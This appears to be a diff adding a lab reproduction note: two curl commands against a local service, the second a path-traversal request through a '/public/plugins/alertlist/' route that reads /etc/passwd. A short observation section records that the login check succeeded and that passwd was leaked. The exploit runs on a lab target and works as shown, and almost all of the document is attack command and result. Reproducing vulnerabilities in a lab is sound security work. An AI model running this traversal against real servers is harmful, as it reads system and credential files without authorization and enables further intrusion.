@@ -1,0 +1,6 @@
+curl -s -i http://127.0.0.1:<LAB_PORT>/login
+curl -s --path-as-is http://127.0.0.1:<LAB_PORT>/public/plugins/alertlist/../../../../../../../../etc/passwd
+
+### 观测
+login_status_ok=True
+passwd_leaked=True
